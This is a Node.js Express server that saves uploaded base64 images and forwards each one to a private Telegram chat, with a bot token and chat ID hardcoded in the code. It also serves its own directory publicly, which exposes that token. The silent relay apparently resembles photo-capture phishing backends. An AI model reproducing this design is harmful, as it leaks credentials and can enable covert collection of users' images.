const express = require("express");
const fs = require("fs");
const cors = require("cors");
const path = require("path");
const axios = require("axios");

const app = express();

// 🔥 ใช้ port ของ Render
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: "50mb" }));

// 🔥 สร้างโฟลเดอร์ uploads ถ้ายังไม่มี
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// 🔥 เปิดให้เข้าถึงรูปได้
app.use("/uploads", express.static(uploadDir));

// เปิด static file
app.use(express.static(__dirname));

// route หน้าเว็บ
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// 🔥 upload + ส่ง Telegram
app.post("/upload", async (req, res) => {
  try {
    const image = req.body.image;

    const base64Data = image.replace(/^data:image\/\w+;base64,/, "");

    const filename = path.join(uploadDir, Date.now() + ".jpg");

    fs.writeFileSync(filename, base64Data, "base64");

    console.log("Saved:", filename);

    // =========================
    // 🔥 ใส่ข้อมูล Telegram ตรงนี้
    // =========================
    const BOT_TOKEN = "8357900739:AAEe5xZDHlLfIz7uH8INU0SKKkB9dh8zCTk";
    const CHAT_ID = "297402713";

    // 🔥 ส่งรูปเข้า Telegram
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      chat_id: CHAT_ID,
      photo: image
    });

    console.log("Sent to Telegram");

    res.send("saved");

  } catch (err) {
    console.log(err);
    res.status(500).send("error");
  }
});

// run server
app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});